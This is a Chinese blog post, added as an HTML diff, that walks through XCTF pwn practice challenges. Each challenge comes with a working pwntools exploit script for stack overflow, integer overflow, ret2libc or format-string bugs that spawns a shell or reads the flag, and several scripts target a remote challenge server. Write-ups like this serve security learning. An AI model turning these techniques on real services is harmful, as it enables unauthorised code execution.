@@ -1,0 +1,838 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zn-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XCTF（攻防世界）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xctf">
+<meta property="og:url" content="https://caiii-vegtable.github.io/2020/05/03/xctf/index.html">
+<meta property="og:site_name" content="Haus">
+<meta property="og:description" content="XCTF（攻防世界）">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/1-1588483863605.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/2-1588483877908.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/3-1588483560290.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/4-1588483568467.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/5-1588483573924.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/6-1588483590991.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/1-1588483608895.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/2-1588483612831.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/3-1588483616370.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/4-1588483622772.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/5-1588483628490.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/6-1588483637270.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/7-1588483648909.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/3.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/1-1588516969335.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/2-1588516987385.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/4.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/bh.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/1-1588518101979.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/2-1588518299606.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/3-1588518374939.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/4-1588518433076.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/bh-1588559050447.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/1-1588559067813.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/2-1588559183363.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/3-1588559193002.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/4-1588559240165.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/1-1588560963222.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/2-1588560976657.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/6.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/3-1588561245633.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/4-1588561236188.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/5.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/3-1588770463086.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/1-1588770479803.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/2-1588770488836.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/4-1588770858687.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/1-1589092573286.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/2-1589092604606.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/4-1589093959185.jpg">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf/5-1589094370897.jpg">
+<meta property="article:published_time" content="2020-05-03T04:34:51.000Z">
+<meta property="article:modified_time" content="2020-05-10T07:06:46.000Z">
+<meta property="article:author" content="caiii-vegtable">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://caiii-vegtable.github.io/image/xctf/1-1588483863605.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://caiii-vegtable.github.io/2020/05/03/xctf/"/>
+
+
+
+
+
+  <title>xctf | Haus</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zn-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Haus</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://caiii-vegtable.github.io/2020/05/03/xctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="caiii-vegtable">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Haus">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xctf</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-03T12:34:51+08:00">
+                2020-05-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="XCTF（攻防世界）"><a href="#XCTF（攻防世界）" class="headerlink" title="XCTF（攻防世界）"></a>XCTF（攻防世界）</h1><a id="more"></a>
+
+<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><img src="/image/xctf/1-1588483863605.png" alt="1" style="zoom:50%;" />
+
+<img src="/image/xctf/2-1588483877908.png" alt="2" style="zoom:50%;" />
+
+<p>输入1进入login，输入name和password，限制了大小0x19和0x199，无法溢出。</p>
+<p>Check_password检验密码的长度，复制到dest。</p>
+<img src="/image/xctf/3-1588483560290.png" alt="3" style="zoom:50%;" />
+
+<p>dest溢出覆盖返回地址需要0x18的大小。而输入在3和8之间才能进入strcpy。</p>
+<p>注意到v3是unsigned_int8类型。如果超出2^8-1=255时就会整数溢出。</p>
+<p>所以长度在259~264之间就可以。</p>
+<p>看到存在函数what_is_this可以cat flag，地址位0x0804868b</p>
+<p><img src="/image/xctf/4-1588483568467.png" alt="4"></p>
+<p><img src="/image/xctf/5-1588483573924.png" alt="5"></p>
+<p>exp（获取动态环境失败？所以本地啦）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./t1'</span>)</span><br><span class="line"><span class="comment">#p=remote() 攻防世界获取动态环境失败？？</span></span><br><span class="line"></span><br><span class="line">cat_addr = <span class="number">0x0804868b</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p32(cat_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">260</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'q_q'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'passwd:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/xctf/6-1588483590991.png" alt="6"></p>
+<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p>看一下保护。</p>
+<p><img src="/image/xctf/1-1588483608895.png" alt="1"></p>
+<p>ida打开</p>
+<p><img src="/image/xctf/2-1588483612831.png" alt="2"></p>
+<p>Hello函数，fgets将输入的存到name的位置，name是全局变量，存放在bss段</p>
+<img src="/image/xctf/3-1588483616370.png" alt="3" style="zoom:50%;" />
+
+<p>gets函数可以读入任意字节，可以溢出。</p>
+<p>存在pwn函数调用了system函数，但是没有‘/bin/sh’</p>
+<p><img src="/image/xctf/4-1588483622772.png" alt="4"></p>
+<p>可以通过前面的fgets读入。</p>
+<p>查看system的地址和name的地址</p>
+<p><img src="/image/xctf/5-1588483628490.png" alt="5"></p>
+<p><img src="/image/xctf/6-1588483637270.png" alt="6"></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./t2'</span>)</span><br><span class="line"><span class="comment">#p.remote()</span></span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x08048420</span></span><br><span class="line">name_addr = <span class="number">0x0804a080</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x26</span>+<span class="string">'b'</span>*<span class="number">4</span>+p32(system_addr)+<span class="string">'c'</span>*<span class="number">4</span>+p32(name_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'here:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/xctf/7-1588483648909.png" alt="7"></p>
+<h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h2><p>先看一下保护。</p>
+<p><img src="/image/xctf/3.jpg" alt="3"></p>
+<p>开了canary，栈溢出会检测。开nx，堆栈不可执行。</p>
+<p>再ida查看</p>
+<img src="/image/xctf/1-1588516969335.jpg" alt="1" style="zoom: 50%;" />
+
+<p>main函数里，先输入整数，如果等于1926就退出。不等于就再输入名字。这里有一个gets函数可以读入任意长度。（但是开了canary）</p>
+<p>输入名字后输入生日，如果等于1926就cat flag。</p>
+<img src="/image/xctf/2-1588516987385.jpg" alt="2" style="zoom: 67%;" />
+
+<p>在ida查看栈。var_20是v4，var_18是v5。可以通过v4覆盖v5位1926。距离是0x20-0x18=8。</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./when_did_you_born'</span>)</span><br><span class="line"><span class="comment">#p=remote('124.126.19.106',57445)</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x20</span><span class="number">-0x18</span>)*<span class="string">'a'</span>+p64(<span class="number">1926</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Birth?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'2000'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Name?\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/xctf/4.jpg" alt="4"></p>
+<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>checksec~</p>
+<p><img src="/image/xctf/bh.jpg" alt="bh"></p>
+<p>ida~</p>
+<p><img src="/image/xctf/1-1588518101979.jpg" alt="1"></p>
+<p>read从标准输入读0x10个字符到unk_601068，当dword_60106C等于0x6E75161时调用函数sub_400686()。</p>
+<p>unk_601068和dword_60106C的地址</p>
+<p><img src="/image/xctf/2-1588518299606.jpg" alt="2"></p>
+<p>差4个字符，可以覆盖。</p>
+<p>sub_400686()函数cat flag</p>
+<p><img src="/image/xctf/3-1588518374939.jpg" alt="3"></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./hello_pwn')</span></span><br><span class="line">p=remote(<span class="string">'124.126.19.106'</span>,<span class="number">37792</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> + p64(<span class="number">0x6e756161</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'bof\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/xctf/4-1588518433076.jpg" alt="4"></p>
+<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>checksec~</p>
+<p><img src="/image/xctf/bh-1588559050447.jpg" alt="bh"></p>
+<p>ida~</p>
+<p><img src="/image/xctf/1-1588559067813.jpg" alt="1"></p>
+<p>read可以读入0x200字符，缓冲区只有0x80。栈溢出。</p>
+<p>callsystem函数可以getshell，地址为0x400596</p>
+<p><img src="/image/xctf/2-1588559183363.jpg" alt="2"></p>
+<p><img src="/image/xctf/3-1588559193002.jpg" alt="3"></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./level0')</span></span><br><span class="line">p=remote(<span class="string">'124.126.19.106'</span>,<span class="number">48715</span>)</span><br><span class="line"></span><br><span class="line">callsystem_addr = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'b'</span>*<span class="number">8</span> +p64(callsystem_addr)+<span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/xctf/4-1588559240165.jpg" alt="4"></p>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>checksec</p>
+<p><img src="/image/xctf/1-1588560963222.jpg" alt="1"></p>
+<p>ida</p>
+<p><img src="/image/xctf/2-1588560976657.jpg" alt="2"></p>
+<p>还是read函数的栈溢出。</p>
+<p>有system函数，还需要/bin/sh</p>
+<p>查看字符串</p>
+<p><img src="/image/xctf/6.jpg" alt="6"></p>
+<p>system地址和binsh地址</p>
+<p><img src="/image/xctf/3-1588561245633.jpg" alt="3"></p>
+<p><img src="/image/xctf/4-1588561236188.jpg" alt="4"></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./level2'</span>)</span><br><span class="line"><span class="comment">#p=remote('124.126.19.106',41081)</span></span><br><span class="line"></span><br><span class="line">system_addr=<span class="number">0x8048320</span></span><br><span class="line">binsh_addr=<span class="number">0x804a024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'b'</span>*<span class="number">4</span>+p32(system_addr)+<span class="string">'b'</span>*<span class="number">4</span>+p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/xctf/5.jpg" alt="5"></p>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>checksec</p>
+<p><img src="/image/xctf/3-1588770463086.jpg" alt="3"></p>
+<p>ida</p>
+<p><img src="/image/xctf/1-1588770479803.jpg" alt="1"></p>
+<p><img src="/image/xctf/2-1588770488836.jpg" alt="2"></p>
+<p>没有system和/bin/sh</p>
+<p>read函数可以溢出。</p>
+<p>通过write函数泄露libc版本，计算system和/bin/sh的地址。</p>
+<p>先第一次溢出调用write泄露libc版本，再返回main函数</p>
+<p>第二次溢出调用system函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./level3')</span></span><br><span class="line">p=remote(<span class="string">'124.126.19.106'</span>,<span class="number">56514</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload1=<span class="number">0x88</span>*<span class="string">'a'</span>+<span class="number">4</span>*<span class="string">'b'</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#第一次溢出调用write，返回main</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write)</span><br><span class="line">libc_base=write-libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="number">0x88</span>*<span class="string">'a'</span>+<span class="number">4</span>*<span class="string">'b'</span>+p32(system_addr)+<span class="string">'b'</span>*<span class="number">4</span>+p32(binsh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/xctf/4-1588770858687.jpg" alt="4"></p>
+<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>checksec</p>
+<p><img src="/image/xctf/1-1589092573286.jpg" alt="1"></p>
+<p>打开了NX和Canary</p>
+<p>ida</p>
+<img src="/image/xctf/2-1589092604606.jpg" alt="2" style="zoom:67%;" />
+
+<p>是一个输入然后回显的程序。</p>
+<p>pwnme等于8的时候cat flag</p>
+<p>第二个printf存在格式化字符串漏洞。（参考<a href="https://wiki.x10sec.org/pwn/fmtstr/fmtstr_intro/）" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/fmtstr/fmtstr_intro/）</a></p>
+<p>可以通过格式化字符串漏洞覆盖pwnme的值为8.</p>
+<p>运行程序输入:</p>
+<p>AAAA%p/%p/%p/%p/%p/%p/%p/%p/%p······</p>
+<p><img src="/image/xctf/4-1589093959185.jpg" alt="4"></p>
+<p>输入的AAAA（0x41414141）是第11个参数。</p>
+<p>利用%n（将已经输出的字符数赋给对应的整型指针参数所指向的变量）</p>
+<p>n$获取格式化字符串中的指定参数。（获取的是第n+1个参数，因为格式化参数里面的n指的是该格式化字符串对应的第n个输出参数，那相对于输出函数来说，就是第n+1个参数了。）</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'124.126.19.106'</span>,<span class="number">43879</span>)</span><br><span class="line"><span class="comment">#p=process('./CGfsb')</span></span><br><span class="line"></span><br><span class="line">pwnme_addr=<span class="number">0x0804A068</span></span><br><span class="line">payload = p32(pwnme_addr)+<span class="string">'a'</span>*<span class="number">4</span>+<span class="string">'%10$n'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'q_q'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/xctf/5-1589094370897.jpg" alt="5"></p>
+<p>待续。。。。。。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/03/bugku-pwn/" rel="next" title="bugku-pwn">
+                <i class="fa fa-chevron-left"></i> bugku-pwn
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/07/19/hello-world/" rel="prev" title="Hello World">
+                Hello World <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.jpg"
+                alt="caiii-vegtable" />
+            
+              <p class="site-author-name" itemprop="name">caiii-vegtable</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
